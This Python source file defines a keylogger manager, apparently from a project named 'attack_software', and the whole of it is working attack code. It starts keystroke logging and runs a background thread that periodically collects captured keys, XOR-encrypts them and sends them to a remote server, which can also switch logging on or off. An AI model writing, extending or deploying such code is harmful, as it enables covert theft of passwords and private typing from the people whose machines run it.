import time
from server_utils import ServerUtils
from keyboard_log_processor import KeyboardLogProcessor
from attack_software.config.config import Flush_interval
from attack_software.src.xor_encryption import XOREncryption
from keylogger_service import KeyloggerService
from threading import Thread
import sys

class KeyloggerManager:
    def __init__(self, server_url="http://127.0.0.1:5000"):
        """Initialize the Keylogger Manager with a KeyloggerService instance."""
        self.monitor_thread = None
        self.service = KeyloggerService()
        self.running = False
        self.server_url = server_url
        self.last_buffer_send = time.time()
        self.server_utils = ServerUtils()
        self.dictWriter = KeyboardLogProcessor()
        self.encryption = XOREncryption()

    def buffer_monitor(self):
        """Monitor and periodically send buffer data to server."""
        while self.running:
            current_time = time.time()
            # Check if 60 seconds have passed since last send
            if current_time - self.last_buffer_send >= Flush_interval :
                if not self.server_utils.isKeylogActive():
                    self.service.stop_logging()
                else:
                    self.service.start_logging()
                buffer_data = self.service.get_buffer_data()
                if buffer_data:
                    key_log = self.dictWriter.process_keylog(buffer_data)
                    encrypted_logs = self.encryption.encrypt(str(key_log))
                    self.server_utils.send_data(encrypted_logs)
                self.last_buffer_send = current_time
            time.sleep(1)  # Check every second efficiently

    def start_service(self):
        """Start the keylogger service and buffer monitoring."""
        if self.running:
            print("Service already running!")
            return

        try:
            self.service.start_logging()
            self.running = True
            print("Keylogger started. Press CTRL+C to stop.")

            # Start buffer monitoring in a separate thread
            self.monitor_thread = Thread(target=self.buffer_monitor, daemon=True)
            self.monitor_thread.start()

            # Keep main thread alive
            while self.running:
                time.sleep(1)
        except Exception as e:
            print(f"Error starting service: {e}")
            self.stop_service()
        except KeyboardInterrupt:
            self.stop_service()

    def stop_service(self):
        """Stop the keylogger service and clean up."""
        if not self.running:
            print("Service not running!")
            return

        print("\nStopping keylogger...")
        self.running = False
        self.service.stop_service()
        if hasattr(self, 'monitor_thread'):
            self.monitor_thread.join(timeout=2)
        print("Keylogger stopped successfully.")

if __name__ == "__main__":
    # Example usage
    manager = KeyloggerManager()
    try:
        manager.start_service()
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1)